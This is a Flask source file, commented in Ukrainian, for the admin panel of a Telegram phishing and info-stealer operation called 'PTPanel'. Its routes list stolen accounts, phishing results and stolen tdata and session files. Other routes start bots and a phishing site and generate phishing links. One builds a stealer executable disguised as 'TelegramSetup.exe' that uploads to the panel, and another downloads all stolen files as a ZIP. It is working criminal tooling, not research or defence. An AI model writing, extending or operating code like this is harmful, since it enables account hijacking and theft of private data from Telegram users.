# web/admin/routes.py
from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify, send_file
from core.database import db_manager
from models.db_models import Admin, Account, PhishingResult, StolenFile, Service, SystemLog, UserConfig
from core.security import verify_password, hash_password
from core.config_manager import config_manager
import logging
from datetime import datetime
from functools import wraps
import os
import asyncio

admin_bp = Blueprint('admin', __name__)
logger = logging.getLogger(__name__)

# Допоміжна функція для перевірки авторизації
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            flash('Будь ласка, увійдіть в систему', 'warning')
            return redirect(url_for('admin.admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# Допоміжна функція для перевірки головного адміна
def main_admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_main_admin'):
            flash('Доступ заборонено. Потрібні права головного адміна', 'danger')
            return redirect(url_for('admin.admin_dashboard'))
        return f(*args, **kwargs)
    return decorated_function

@admin_bp.route('/login', methods=['GET', 'POST'])
def admin_login():
    """Форма входу в адмін-панель"""
    if 'admin_logged_in' in session:
        return redirect(url_for('admin.admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        db_session = db_manager.get_session()
        try:
            admin = db_session.query(Admin).filter(Admin.username == username).first()
            
            if admin and verify_password(password, admin.password_hash) and admin.is_active:
                session['admin_logged_in'] = True
                session['admin_username'] = admin.username
                session['admin_id'] = admin.id
                session['is_main_admin'] = (admin.username == 'admin')
                
                admin.last_login = datetime.utcnow()
                db_session.commit()
                
                # Оновлюємо конфігурацію після логіну
                from config import config
                config.refresh_telegram_config(admin.id)
                
                flash(f'Вітаємо, {admin.username}! Успішний вхід в систему.', 'success')
                logger.info(f"Admin {admin.username} logged in")
                
                # Після логіну перекидаємо на Settings
                return redirect(url_for('admin.admin_settings'))
            else:
                flash('Невірний логін або пароль!', 'danger')
                logger.warning(f"Failed login attempt for username: {username}")
                
        except Exception as e:
            flash('Помилка сервера при авторизації', 'danger')
            logger.error(f"Login error: {e}")
        finally:
            db_session.close()
    
    return render_template('admin/login.html', app_name="PTPanel")

@admin_bp.route('/logout')
def admin_logout():
    """Вихід з системи"""
    username = session.get('admin_username', 'Unknown')
    session.clear()
    flash('Ви вийшли з системи', 'info')
    logger.info(f"Admin {username} logged out")
    return redirect(url_for('admin.admin_login'))

@admin_bp.route('/')
@login_required
def admin_dashboard():
    """Головна сторінка адмінки з РЕАЛЬНОЮ статистикою"""
    db_session = db_manager.get_session()
    try:
        # РЕАЛЬНА СТАТИСТИКА З БАЗИ ДАНИХ
        accounts_count = db_session.query(Account).count()
        results_count = db_session.query(PhishingResult).count()
        files_count = db_session.query(StolenFile).count()
        services_count = 5  # фіксовано (4 боти + сайт)
        
        # Останні 5 результатів фішингу
        recent_results = db_session.query(PhishingResult).order_by(
            PhishingResult.timestamp.desc()
        ).limit(5).all()

        return render_template('admin/dashboard.html', 
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts_count=accounts_count,
                             results_count=results_count,
                             files_count=files_count,
                             services_count=services_count,
                             recent_results=recent_results)
                             
    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        flash('Помилка завантаження статистики', 'danger')
        return render_template('admin/dashboard.html', 
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts_count=0, 
                             results_count=0, 
                             files_count=0,
                             services_count=5)
    finally:
        db_session.close()

@admin_bp.route('/devices')
@login_required
def admin_devices():
    """Управління акаунтами"""
    db_session = db_manager.get_session()
    try:
        accounts = db_session.query(Account).all()
        return render_template('admin/devices.html',
                             app_name="PTPanel", 
                             current_user={'username': session.get('admin_username')},
                             accounts=accounts)
    except Exception as e:
        logger.error(f"Devices page error: {e}")
        return render_template('admin/devices.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts=[])
    finally:
        db_session.close()

@admin_bp.route('/stealer')
@login_required
def admin_stealer():
    """Stealer білдер з реальними даними"""
    db_session = db_manager.get_session()
    try:
        stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
        
        # Статистика файлів
        total_files = len(stolen_files)
        tdata_count = len([f for f in stolen_files if f.data_type == 'tdata'])
        sessions_count = len([f for f in stolen_files if f.data_type == 'session'])
        
        return render_template('admin/stealer.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             stolen_files=stolen_files,
                             total_files=total_files,
                             tdata_count=tdata_count,
                             sessions_count=sessions_count,
                             is_main_admin=session.get('is_main_admin', False))
    except Exception as e:
        logger.error(f"Stealer page error: {e}")
        return render_template('admin/stealer.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             stolen_files=[],
                             total_files=0,
                             tdata_count=0,
                             sessions_count=0,
                             is_main_admin=session.get('is_main_admin', False))
    finally:
        db_session.close()

# web/admin/routes.py - ДОДАЄМО ФУНКЦІЮ ДЛЯ SERVICES
@admin_bp.route('/services')
@login_required
def admin_services():
    """Сервіси та білдер посилань"""
    from core.config_manager import config_manager
    from core.service_manager import service_manager
    
    # Завантажуємо налаштування для валідації
    telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
    bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
    
    # Перевіряємо валідність налаштувань
    validation_errors = []
    has_telegram_api = bool(telegram_config.get('api_id') and telegram_config.get('api_hash'))
    can_start_admin_bot = bool(bots_config.get('admin_token'))
    can_start_webapp_bot = bool(bots_config.get('webapp_token'))
    can_start_classic_bot = bool(bots_config.get('classic_token'))
    can_start_multitool_bot = bool(bots_config.get('multitool_token'))
    
    # Додаємо помилки валідації
    if not has_telegram_api:
        validation_errors.append("Telegram API ID and Hash are required for bot functionality")
    if not can_start_admin_bot:
        validation_errors.append("Admin Bot token is missing")
    if not can_start_webapp_bot:
        validation_errors.append("WebApp Bot token is missing")
    if not can_start_classic_bot:
        validation_errors.append("Classic Bot token is missing")
    if not can_start_multitool_bot:
        validation_errors.append("Multitool Bot token is missing")
    
    # Отримуємо статуси сервісів
    services_status = {
        'admin_bot': service_manager.get_service_status('admin_bot'),
        'webapp_bot': service_manager.get_service_status('webapp_bot'),
        'classic_bot': service_manager.get_service_status('classic_bot'),
        'multitool_bot': service_manager.get_service_status('multitool_bot'),
        'phishing_site': service_manager.get_service_status('phishing_site')
    }
    
    return render_template('admin/services.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         services_status=services_status,
                         validation_errors=validation_errors,
                         has_telegram_api=has_telegram_api,
                         can_start_admin_bot=can_start_admin_bot,
                         can_start_webapp_bot=can_start_webapp_bot,
                         can_start_classic_bot=can_start_classic_bot,
                         can_start_multitool_bot=can_start_multitool_bot)

# Додаємо API endpoints для керування сервісами
@admin_bp.route('/services/start/<service_name>', methods=['POST'])
@login_required
def start_service(service_name):
    """Запуск сервісу"""
    try:
        from core.service_manager import service_manager
        from core.config_manager import config_manager
        
        # Перевіряємо валідність налаштувань перед запуском
        if service_name.endswith('_bot'):
            bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
            telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
            
            # Перевірка токену бота
            token_key = service_name.replace('_bot', '_token')
            if not bots_config.get(token_key):
                return jsonify({'success': False, 'error': f'Missing {service_name} token'})
            
            # Перевірка Telegram API
            if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
                return jsonify({'success': False, 'error': 'Telegram API not configured'})
        
        success = service_manager.start_service(service_name)
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Service start error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/services/stop/<service_name>', methods=['POST'])
@login_required
def stop_service(service_name):
    """Зупинка сервісу"""
    try:
        from core.service_manager import service_manager
        success = service_manager.stop_service(service_name)
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Service stop error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/services/restart/<service_name>', methods=['POST'])
@login_required
def restart_service(service_name):
    """Перезапуск сервісу"""
    try:
        from core.service_manager import service_manager
        from core.config_manager import config_manager
        
        # Перевіряємо валідність налаштувань перед перезапуском
        if service_name.endswith('_bot'):
            bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
            telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
            
            token_key = service_name.replace('_bot', '_token')
            if not bots_config.get(token_key):
                return jsonify({'success': False, 'error': f'Missing {service_name} token'})
            
            if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
                return jsonify({'success': False, 'error': 'Telegram API not configured'})
        
        success = service_manager.restart_service(service_name)
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Service restart error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/services/start_all', methods=['POST'])
@login_required
def start_all_services():
    """Запуск всіх сервісів"""
    try:
        from core.service_manager import service_manager
        from core.config_manager import config_manager
        
        # Перевіряємо налаштування перед запуском
        bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
        telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
        
        validation_errors = []
        
        if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
            validation_errors.append('Telegram API not configured')
        
        bot_services = ['admin_bot', 'webapp_bot', 'classic_bot', 'multitool_bot']
        for service in bot_services:
            token_key = service.replace('_bot', '_token')
            if not bots_config.get(token_key):
                validation_errors.append(f'Missing {service} token')
        
        if validation_errors:
            return jsonify({'success': False, 'error': '; '.join(validation_errors)})
        
        success = service_manager.start_all_services()
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Start all services error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/services/stop_all', methods=['POST'])
@login_required
def stop_all_services():
    """Зупинка всіх сервісів"""
    try:
        from core.service_manager import service_manager
        success = service_manager.stop_all_services()
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Stop all services error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/services/generate_link', methods=['POST'])
@login_required
def generate_link():
    """Генерація унікального посилання"""
    try:
        data = request.get_json()
        redirect_url = data.get('url', '')
        
        if not redirect_url:
            return jsonify({'success': False, 'error': 'URL is required'})
        
        # Генеруємо унікальний ідентифікатор
        import uuid
        unique_id = str(uuid.uuid4())[:8]
        
        # Створюємо посилання
        generated_link = f"{request.host_url}phishing/{unique_id}"
        
        # Зберігаємо в базу даних (потім реалізуємо)
        # save_unique_link(unique_id, redirect_url, session['admin_id'])
        
        return jsonify({
            'success': True,
            'generated_link': generated_link,
            'unique_id': unique_id
        })
        
    except Exception as e:
        logger.error(f"Link generation error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/settings', methods=['GET'])
@login_required
def admin_settings():
    """Сторінка налаштувань"""
    # Завантажуємо всі налаштування
    settings = {
        'telegram': config_manager.load_user_config(session['admin_id'], 'telegram'),
        'server': config_manager.load_user_config(session['admin_id'], 'server'),
        'bots': config_manager.load_user_config(session['admin_id'], 'bots'),
        'additional': config_manager.load_user_config(session['admin_id'], 'additional')
    }
    
    return render_template('admin/settings.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         settings=settings)

@admin_bp.route('/settings/save/<config_type>', methods=['POST'])
@login_required
def save_settings(config_type):
    """Збереження налаштувань"""
    try:
        data = request.get_json()
        success = config_manager.save_user_config(session['admin_id'], config_type, data)
        
        if success:
            # Оновлюємо конфігурацію
            from config import config
            config.refresh_telegram_config(session['admin_id'])
            
        return jsonify({'success': success})
        
    except Exception as e:
        logger.error(f"Settings save error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@admin_bp.route('/settings/change_password', methods=['POST'])
@login_required
def change_password():
    """Зміна пароля адміна"""
    try:
        data = request.get_json()
        new_password = data.get('new_password')
        confirm_password = data.get('confirm_password')
        
        if not new_password:
            return jsonify({'success': False, 'error': 'Пароль не може бути порожнім'})
        
        if new_password != confirm_password:
            return jsonify({'success': False, 'error': 'Паролі не співпадають'})
        
        db_session = db_manager.get_session()
        admin = db_session.query(Admin).filter(Admin.id == session['admin_id']).first()
        
        if admin:
            admin.password_hash = hash_password(new_password)
            db_session.commit()
            logger.info(f"Password changed for admin {admin.username}")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Адмін не знайдений'})
            
    except Exception as e:
        logger.error(f"Password change error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()

# 🆕 ДОДАЄМО ВІДСУТНІ МАРШРУТИ ДЛЯ МЕНЮ
@admin_bp.route('/logs')
@login_required
@main_admin_required
def admin_logs():
    """Логи системи (тільки для головного адміна)"""
    return render_template('admin/logs.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         is_main_admin=session.get('is_main_admin', False))

@admin_bp.route('/admins')
@login_required
@main_admin_required
def admin_admins():
    """Управління адмінами (тільки для головного адміна)"""
    db_session = db_manager.get_session()
    try:
        admins = db_session.query(Admin).all()
        return render_template('admin/admins.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             is_main_admin=session.get('is_main_admin', False),
                             admins=admins)
    except Exception as e:
        logger.error(f"Admins page error: {e}")
        return render_template('admin/admins.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             is_main_admin=session.get('is_main_admin', False),
                             admins=[])
    finally:
        db_session.close()

# API endpoints для адмінки
@admin_bp.route('/api/stats')
@login_required
def api_stats():
    """API для отримання статистики"""
    db_session = db_manager.get_session()
    try:
        accounts_count = db_session.query(Account).count()
        results_count = db_session.query(PhishingResult).count()
        files_count = db_session.query(StolenFile).count()
        
        return jsonify({
            'accounts': accounts_count,
            'results': results_count,
            'files': files_count
        })
    except Exception as e:
        logger.error(f"API stats error: {e}")
        return jsonify({'error': str(e)}), 500
    finally:
        db_session.close()

@admin_bp.route('/build_stealer', methods=['POST'])
@login_required
def build_stealer():
    """Побудова стіллера з завантаженням .exe"""
    try:
        filename = request.form.get('filename', 'TelegramSetup')
        admin_id = request.form.get('admin_id', session.get('admin_id'))
        features = request.form.getlist('features')
        
        logger.info(f"Building stealer for admin {session.get('admin_username')}")
        logger.info(f"Features: {features}")
        
        # Викликаємо білдер стіллера
        from core.stealer_builder import stealer_builder
        
        stealer_config = {
            'server_url': f"{request.host_url}api/upload",
            'admin_id': admin_id,
            'target_admin': session.get('admin_username'),
            'features': features,
            'version': '1.0.0'
        }
        
        output_path = f"client/dist/{filename}.exe"
        success = stealer_builder.build_stealer(stealer_config, output_path)
        
        if success:
            # Завантажуємо .exe файл в браузер
            return send_file(output_path, as_attachment=True)
        else:
            flash('Помилка при побудові стіллера', 'danger')
            
    except Exception as e:
        flash(f'Помилка при побудові стіллера: {str(e)}', 'danger')
        logger.error(f"Stealer build error: {e}")
    
    return redirect(url_for('admin.admin_stealer'))

@admin_bp.route('/add_account', methods=['POST'])
@login_required
def add_account():
    """Додавання акаунта"""
    method = request.form.get('method')
    
    try:
        if method == 'phone':
            phone = request.form.get('phone')
            flash(f'Акаунт з номером {phone} додано!', 'success')
        elif method == 'session':
            flash('Session файл успішно завантажено!', 'success')
        elif method == 'tdata':
            flash('Tdata архів успішно завантажено!', 'success')
        elif method == 'qr':
            flash('QR код успішно оброблено!', 'success')
    except Exception as e:
        flash(f'Помилка додавання акаунта: {str(e)}', 'danger')
        logger.error(f"Add account error: {e}")
    
    return redirect(url_for('admin.admin_devices'))

@admin_bp.route('/stealer/download_all')
@login_required
def download_all_files():
    """Завантаження всіх вкрадених файлів як ZIP архів"""
    try:
        import zipfile
        import io
        
        db_session = db_manager.get_session()
        stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
        
        if not stolen_files:
            flash('Немає файлів для завантаження', 'warning')
            return redirect(url_for('admin.admin_stealer'))
        
        # Створюємо ZIP архів в пам'яті
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file in stolen_files:
                if os.path.exists(file.file_path):
                    # Додаємо файл в архів з відносним шляхом
                    zip_file.write(file.file_path, os.path.basename(file.file_path))
        
        zip_buffer.seek(0)
        
        # Відправляємо ZIP файл
        return send_file(
            zip_buffer,
            as_attachment=True,
            download_name=f'stolen_files_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip',
            mimetype='application/zip'
        )
        
    except Exception as e:
        logger.error(f"Download all files error: {e}")
        flash('Помилка при створенні архіву', 'danger')
        return redirect(url_for('admin.admin_stealer'))
    finally:
        db_session.close()